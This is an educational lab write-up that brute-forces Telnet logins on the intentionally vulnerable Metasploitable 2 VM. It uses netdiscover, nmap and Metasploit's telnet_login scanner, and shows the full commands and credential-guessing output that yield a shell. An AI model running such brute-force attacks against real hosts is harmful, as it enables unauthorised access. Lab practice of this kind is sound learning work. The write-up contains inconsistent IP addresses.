# Metasploitable 2 Telnet exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - **Telnet**.



 > The target of this lab is use vulnerablitity in Telnet service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
23/tcp   open  telnet      Linux telnetd
.
.
.
```

Now we use metasploit to search and exploit vulnerablity.

`sudo msfdb init && msfconsole`



`msf6 > search telnet_login`


```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  auxiliary/scanner/telnet/telnet_login                             .                normal  No     Telnet Login Check Scanner
```

## 3- Exploit

Now as we find exploit on metasploit, so we use this exploit to gain root access.

`msf6 > use 1`

For setting of exploit;

 `msf6 auxiliary(scanner/telnet/telnet_login) > show options`

In options we see Remote Host, Password file and user file is not set, so use `set RHOST 192.168.43.95`, to set remote host, `set PASs_FILE login.txt` to set Password file and `set user_file login.txt` to user User login file.

> *login.txt* is file conists of passwords and user id that I have created my own.




 Now with all set, just hit `run`


 ```
-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:admin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:root (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:msfadmin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:123 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:123456 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: admin:12345678 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:admin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:root (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:msfadmin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:123 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:123456 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: root:12345678 (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:admin (Incorrect: )
[-] 192.168.43.95:23      - 192.168.43.95:23 - LOGIN FAILED: msfadmin:root (Incorrect: )
[+] 192.168.43.95:23      - 192.168.43.95:23 - Login Successful: msfadmin:msfadmin
[*] 192.168.43.95:23      - Attempting to start session 192.168.43.95:23 with msfadmin:msfadmin
[*] Command shell session 1 opened (192.168.43.132:33035 -> 192.168.43.95:23) at 2024-06-29 00:24:21 -0400
[*] 192.168.43.95:23      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution complete
```

 After exiting the msf terminal, use `telnet 192.168.43.95` to use telnet, it requires password and id, use *msfadmin* that we have found during bruteforce.

